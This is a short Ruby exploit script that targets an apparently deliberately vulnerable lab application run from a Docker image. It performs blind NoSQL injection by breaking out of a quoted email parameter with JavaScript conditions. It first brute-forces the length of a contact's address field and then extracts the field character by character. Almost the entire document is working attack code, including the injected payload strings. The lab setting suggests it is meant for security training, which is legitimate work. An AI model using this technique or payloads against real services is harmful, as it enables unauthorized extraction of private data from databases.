# docker pull aabashkin/niva
# docker run -p 8080:8080 aabashkin/niva

require 'net/http'

VULNERABLE_PAGE = 'http://192.168.0.111:8080/insecure/basicdbobject-put/contacts/search'
uri = URI(VULNERABLE_PAGE)
EXCLUDE = ['\\', '"']
CHARSET = (' '..?~).to_a - EXCLUDE

def find_length(uri, field)
  Net::HTTP.start(uri.hostname, uri.port) do |http|
    (1..).each do |i|
      # email=<email>" && this.<field>.length == <i> && "1" == "1
      uri.query = 'email=' + URI.encode_uri_component("contact1@private.info\" && this.#{field}.length == #{i} && \"1\" == \"1")
      req = Net::HTTP::Get.new(uri)
      req.basic_auth 'user1', 'pass1'
      res = http.request(req).body
      unless res == '[]'
        puts "Field length: #{i}"
        return i
      end
    end
  end
end

def find_field(uri, field, length)
  field_data = ''
  Net::HTTP.start(uri.hostname, uri.port) do |http|
    (0...length).each do |i|
      CHARSET.each do |c|
        # email=<email>" && this.<field>[<i>] == "<c>
        uri.query = 'email=' + URI.encode_uri_component("contact1@private.info\" && this.#{field}[#{i}] == \"#{c}")
        req = Net::HTTP::Get.new(uri)
        req.basic_auth 'user1', 'pass1'
        res = http.request(req).body
        unless res == '[]'
          puts "Field content: #{field_data + c}"
          field_data += c
        end
      end
    end
  end
end

length = find_length(uri, 'address')
puts
find_field(uri, 'address', length)